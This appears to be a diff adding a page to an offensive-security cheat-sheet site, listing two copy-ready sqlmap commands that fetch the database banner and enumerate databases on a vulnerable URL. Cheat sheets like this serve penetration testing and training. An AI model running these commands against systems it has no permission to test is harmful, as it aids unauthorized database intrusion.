@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<link rel="icon" type="image/x-icon" href="https://gitlab.com/uploads/-/system/project/avatar/40927563/edb-spider-orange.png">
+<link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+	<script>
+		function ctrl_C(element) {
+  		var $temp = $("<input>");
+  		$("body").append($temp);
+  		$temp.val($(element).text()).select();
+  		document.execCommand("copy");
+  		$temp.remove();
+		alert("copied to clipboard.");
+	}	
+	</script>
+  <title> M A C H E T E </title>
+  <!--------------------->
+  <!-- b0ydC Founder -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+</head>
+<body>
+<pre><center>
+<a href="/machete/index.html" style="text-decoration:none;">
+
+   ▄▄▄▄███▄▄▄▄      ▄████████  ▄████████    ▄█    █▄       ▄████████     ███        ▄████████ 
+ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███   ███    ███     ███    ███ ▀█████████▄   ███    ███ 
+ ███   ███   ███   ███    ███ ███    █▀    ███    ███     ███    █▀     ▀███▀▀██   ███    █▀  
+ ███   ███   ███   ███    ███ ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄         ███   ▀  ▄███▄▄▄     
+ ███   ███   ███ ▀███████████ ███        ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀         ███     ▀▀███▀▀▀     
+ ███   ███   ███   ███    ███ ███    █▄    ███    ███     ███    █▄      ███       ███    █▄  
+ ███   ███   ███   ███    ███ ███    ███   ███    ███     ███    ███     ███       ███    ███ 
+  ▀█   ███   █▀    ███    █▀  ████████▀    ███    █▀      ██████████    ▄████▀     ██████████ 
+                                                                                              
+                                      
+</a></pre>
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="/machete/offensive.html">OFFENSIVE</a> |
+    <a href="/machete/defensive.html">DEFENSIVE</a> |
+    <a href="/machete/tools.html">TOOLS</a> |
+    <a href="/machete/about.html">ABOUT</a> 
+</div> 
+
+<p class="titulos"><mark>[SQLMAP]</mark></p>
+<div>
+<button onclick="document.location='/machete/offensive.html'">GO BACK</button>
+<pre><div class="column" style="display: inline-block; text-align: left; background-color:gray;">
+
+<b>0x1: get banner </b><p id="sqlmap01"><mark>sqlmap -u INSERT_VULN_URL --cookie="" -b</mark></p>
+SAMPLE: sqlmap -u http://machetevault.com/view.php?id=1 --cookie="" -b
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap01')">.0x1.</button>
+
+<b>0x2: get databases </b><p id="sqlmap02"><mark>sqlmap -u INSERT_VULN_URL --cookie="" --dbs</mark></p>
+SAMPLE: sqlmap -u http://machetevault.com/view.php?id=1 --cookie="" --dbs
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap02')">.0x2.</button>
+
+
+  
+
+
+
+
+
+  
+</div>
+</pre>
+<button onclick="document.location='/machete/offensive.html'">GO BACK</button>
+</div>
+<p class="titulos">©® - 2023.</p>
+</center>
+</body>
+</html>
